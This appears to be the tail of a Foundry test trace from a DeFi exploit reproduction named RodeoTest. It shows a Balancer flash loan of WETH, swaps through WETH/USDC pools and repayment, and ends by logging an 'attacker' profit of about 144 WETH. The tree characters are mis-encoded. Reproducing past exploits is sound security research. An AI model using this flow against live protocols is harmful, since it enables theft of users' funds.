    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 30000000000000000000 [3e19], amount1In: 0, amount0Out: 0, amount1Out: 65508627119 [6.55e10], to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 65508627119 [6.55e10]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 65508627119 [6.55e10]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 65508627119 [6.55e10]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 65508627119 [6.55e10]
    в”‚   в”‚   в”њв”Ђ [72648] SwapRouter::exactInput(ExactInputParams({ path: 0xff970a61a04b1ca14834a43f5de4533ebddb5cc80001f482af49447d8a07e3bd95bd0d56f35241523fbab1, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1689061625 [1.689e9], amountIn: 65508627119 [6.55e10], amountOutMinimum: 0 }))
    в”‚   в”‚   в”‚   в”њв”Ђ [67250] 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443::swap(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 65508627119 [6.55e10], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bff970a61a04b1ca14834a43f5de4533ebddb5cc80001f482af49447d8a07e3bd95bd0d56f35241523fbab1000000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4200] WETH::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 34720623177300760438 [3.472e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 34720623177300760438 [3.472e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443, to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 34720623177300760438 [3.472e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24065984062123 [2.406e13]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24065984062123 [2.406e13]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11749] SwapRouter::uniswapV3SwapCallback(-34720623177300760438 [-3.472e19], 65508627119 [6.55e10], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bff970a61a04b1ca14834a43f5de4533ebddb5cc80001f482af49447d8a07e3bd95bd0d56f35241523fbab1000000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7663] USDC::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443, 65508627119 [6.55e10])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6911] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443, 65508627119 [6.55e10]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443, value: 65508627119 [6.55e10])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007584549548106 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24131492689242 [2.413e13]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24131492689242 [2.413e13]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(param0: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], param1: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: -34720623177300760438 [-3.472e19], param3: 65508627119 [6.55e10], param4: 3440725233854976924566581 [3.44e24], param5: 13879109380725363892 [1.387e19], param6: -200899 [-2.008e5])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] -34720623177300760438 [-3.472e19], 65508627119 [6.55e10]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 34720623177300760438 [3.472e19]
    в”‚   в”‚   в”њв”Ђ [4200] WETH::transfer(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 30000000000000000000 [3e19])
    в”‚   в”‚   в”‚   в”њв”Ђ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 30000000000000000000 [3e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 30000000000000000000 [3e19])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [1296] WETH::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 11376619658507711702556 [1.137e22]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 11376619658507711702556 [1.137e22]
    в”‚   в”њв”Ђ emit FlashLoan(param0: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], param2: 30000000000000000000 [3e19], param3: 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [826] unsETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [379] unsETH::decimals() [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 18
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker balance of unshETH after exploit", val: 0, decimals: 18)
    в”њв”Ђ [1296] WETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 144219004344154985727 [1.442e20]
    в”‚   в””в”Ђ в†ђ [Return] 144219004344154985727 [1.442e20]
    в”њв”Ђ [3076] WETH::decimals() [staticcall]
    в”‚   в”њв”Ђ [2336] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::decimals() [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в””в”Ђ в†ђ [Return] 18
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker balance of WETH after exploit", val: 144219004344154985727 [1.442e20], decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 313.26ms (9.45ms CPU time)

Ran 2 test suites in 315.49ms (598.95ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
